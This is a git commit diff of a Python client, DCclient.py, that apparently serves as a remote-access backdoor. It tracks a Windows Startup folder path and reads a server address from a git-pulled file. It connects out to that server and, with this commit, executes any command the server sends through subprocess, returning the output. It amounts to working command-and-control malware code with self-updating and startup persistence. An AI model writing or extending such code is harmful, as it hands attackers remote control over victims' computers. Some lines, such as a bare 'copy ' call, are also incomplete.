2d8e35fb9e71515b3e34bfea666cdb6cded47b98
NotMeObviously <62179402+NotMeObviously@users.noreply.github.com>
2021-07-13 20:31:04 +0200

    Update DCclient.py

--- DCclient.py
+++ DCclient.py
@@ -3,36 +3,56 @@ import git
 import time
 import os
 import socket
+import subprocess
 
 hostname = os.getlogin()  # nome dell'utente di sistema
 actual_dir = os.path.join('C:\\Users', str(hostname), 'AppData\Roaming\Microsoft\Windows\Start menu\Programs\Startup')
 
 
+def _do(response_json):
+    if response_json["op"] == "echo":
+        # testata
+        client.send(response_json["args"].encode())
+    elif response_json["op"] == "close":
+        # testata
+        client.close()
+        return True
+    elif response_json["op"] == "pull":
+        pull()
+        subprocess.run("copy ")
+    elif response_json["op"] == "run":
+        res = subprocess.run(response_json["args"])
+        client.send(str(res).encode())
+
+    # false mantiene aperto il ciclo while
+    return False
+
+
 def pull():
     print("[*] pulling...")
-    repo = git.Repo(actual_dir+'\setup')
+    repo = git.Repo(actual_dir + '\setup')
     o = repo.remotes.origin
     o.pull()
+
 
 def search_server_to_connect():
     opened = False
     while not opened:
         try:
             print("[*]searching file...")
-            f=open("setup\\addres.txt","r")
+            f = open("setup\\addres.txt", "r")
             text = f.read()
             host, port = text.split(":")
-            print("[*]FOUND: "+host+" "+port)
+            print("[*]FOUND: " + host + " " + port)
             opened = True
         except FileNotFoundError:
             print("[*]file not found :(")
             time.sleep(20)
             pull()
-    return host,int(port)
+    return host, int(port)
 
 
 hostname = os.getlogin()
-
 
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 connected = False
@@ -40,7 +60,7 @@ while not connected:
     try:
         target_host, target_port = search_server_to_connect()
         print("[*]try connection...")
-        client.connect((target_host,target_port))
+        client.connect((target_host, target_port))
         connected = True
         print("[*]CONNECTED")
     except:
@@ -52,18 +72,7 @@ print(client.recv(4096))
 msg = "Hello! i'm " + hostname + " give me commands"
 client.send(msg.encode())
 while not close:
-
     response = (client.recv(4096)).decode()
     response_json = json.loads(response)
     print(response_json)
-    if response_json["op"] == "echo":
-        client.send(response_json["args"].encode())
-    elif response_json["op"] == "close":
-        client.close()
-        close = True
-
-
-
-
-
-
+    close = _do(response_json)
